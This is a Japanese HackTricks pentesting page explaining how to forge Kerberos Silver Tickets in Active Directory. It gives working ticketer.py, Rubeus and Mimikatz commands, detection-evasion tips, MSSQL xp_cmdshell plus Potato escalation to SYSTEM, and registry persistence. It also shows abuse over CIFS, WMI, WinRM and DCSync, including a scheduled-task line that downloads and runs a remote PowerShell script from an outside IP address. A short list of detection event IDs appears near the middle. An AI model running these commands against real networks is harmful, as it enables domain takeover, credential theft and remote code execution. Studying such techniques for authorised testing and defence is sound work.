# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** attackでは、Active Directory（AD）環境におけるservice ticketを悪用します。この手法では、コンピューターアカウントなどの**service accountのNTLM hashを取得**し、Ticket Granting Service（TGS）ticketを偽造します。偽造したticketを使うと、攻撃者はネットワーク上の特定のserviceにアクセスし、通常は管理者権限を狙って**任意のユーザーになりすます**ことができます。ticketの偽造にはAES keyを使うほうが、より安全で検知されにくい点に注意してください。<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Ticketは、krbtgtアカウントではなく**service accountのhash**だけで作成できるため、Golden Ticketより検知されにくい手法です。ただし、対象とする特定のserviceにしか使えません。また、ユーザーのpasswordを盗むだけの場合も同様です。
さらに、**SPNが設定されたアカウントのpasswordを侵害**した場合、そのpasswordを使って、そのserviceに対して任意のユーザーになりすますSilver Ticketを作成できます。

### Modern Kerberosの変更点（AES-onlyドメイン）

- **2022年11月8日（KB5021131）**以降のWindows更新では、可能な場合、service ticketのsession keyにAESをデフォルトで使用し、RC4を段階的に廃止しています。2026年半ばまでに、DCではRC4がデフォルトで**無効**になる見込みです。そのため、silver ticketにNTLM/RC4 hashを使うと、失敗して `KRB_AP_ERR_MODIFIED` が発生するケースが増えています。対象service accountの**AES key**（`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`）を必ず取得してください。<sup>[[5]](#references)</sup>
- service accountの `msDS-SupportedEncryptionTypes` がAESに制限されている場合は、`/aes256` または `-aesKey` を使って偽造する必要があります。NTLM hashを持っていても、RC4（`/rc4` または `-nthash`）は使えません。<sup>[[6]](#references)</sup>
- gMSA/コンピューターアカウントは30日ごとにローテーションされます。偽造する前に、LSASS、Secretsdump/NTDS、またはDCsyncから**現在のAES key**をdumpしてください。
- OPSEC: ツールのデフォルトのticket有効期間は**10年**であることが多いため、異常な有効期間による検知を避けるには、現実的な期間（例: `-duration 600` 分）を設定してください。<sup>[[6]](#references)</sup>

ticketの作成には、OSに応じて異なるツールを使います。

### Linuxの場合

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Windowsでは

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

CIFS serviceは被害者のファイルシステムにアクセスする一般的なターゲットとして挙げられていますが、HOSTやRPCSSなどの他のserviceも、タスクやWMIクエリに悪用できます。

### 例: MSSQL service (MSSQLSvc) + PotatoでSYSTEM権限を取得

アカウントが所有する**登録済みの正確なSQL service SPN**のNTLM hash（またはAES key）があれば、偽造したservice ticketがそのserviceに受け入れられる可能性があります。ticket内のservice classとhostnameは、実際のSPNと一致している必要があります。すべてのインストールで`MSSQLSvc/`が使われていると思い込まないでください。また、指定したidentityは、`xp_cmdshell`を有効化して実行するために必要な権限を持つSQL loginに対応している必要があります。`xp_cmdshell`コマンドは、SQL serviceのプロセスidentity（またはsysadmin以外の呼び出し元向けに設定されたproxy）で実行されます。別途Potatoを使う前に、その**プロセストークン**で`SeImpersonatePrivilege`が有効か確認してください。service設定やSPNだけでは、それが有効である証拠にはなりません。<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- 結果のコンテキストに SeImpersonatePrivilege がある場合（サービスアカウントではよくあります）、Potato の亜種を使って SYSTEM を取得します。

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

MSSQL の悪用と xp_cmdshell の有効化について詳しくは、以下を参照してください。

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques の概要:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 利用可能なサービス

| サービスの種類                           | サービス Silver Tickets                                                   |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS によっては以下も含む:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては、WINRM だけを要求できます</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share、psexec も含む           | CIFS                                                                       |
| DCSync を含む LDAP 操作                    | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** を使用すると、以下のパラメーターでこれらすべてのチケットを**要求**できます。

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets のイベント ID

- 4624: アカウントのログオン
- 4634: アカウントのログオフ
- 4672: 管理者のログオン
- 同じクライアント/サービスについて、DC 上に先行する 4768/4769 がないことは、偽造された TGS がサービスに直接提示されたことを示す一般的な兆候です。
- 異常に長いチケットの有効期間や、想定外の暗号化方式（ドメインで AES が強制されているのに RC4 が使われている場合）も、4769/4624 のデータで目立ちます。

## 永続化

マシンが30日ごとにパスワードを変更しないようにするには、`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` を設定します。または、`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` を30日より大きい値に設定し、マシンのパスワードを変更する間隔を指定できます。<sup>[[3]](#references)</sup>

## Service tickets の悪用

以下の例では、管理者アカウントになりすましてチケットを取得したとします。

### CIFS

このチケットを使うと、（公開されている場合）**SMB** 経由で `C$` および `ADMIN$` フォルダーにアクセスし、次のような操作でリモートファイルシステム内の任意の場所にファイルをコピーできます。

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

ホスト内で shell を取得したり、**psexec** を使って任意のコマンドを実行したりすることもできます。


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### ホスト

この権限があれば、リモートコンピューター上にスケジュールされたタスクを作成し、任意のコマンドを実行できます。

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

これらのチケットを使うと、被害者システム上で**WMIを実行できます**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

**wmiexec**についての詳細は、以下のページを参照してください。


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

コンピューターへのWinRMアクセスがあれば、そのコンピューターに**アクセス**し、PowerShellを取得することもできます。

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

以下のページでは、**winrmを使ってリモートホストに接続するその他の方法**を確認できます。

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> リモートコンピューターにアクセスするには、**winrmが有効で、リスニング状態である必要があります**。

### LDAP

この権限があれば、**DCSync**を使ってDCのデータベースをダンプできます：

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**DCSync について詳しくは**、以下のページをご覧ください:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Kerberos を攻撃する方法 - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [マシンアカウントのパスワードプロセス - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato の手順](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos の強化と RC4 の廃止](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py の現在のオプション (AES/keytab/有効期間)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
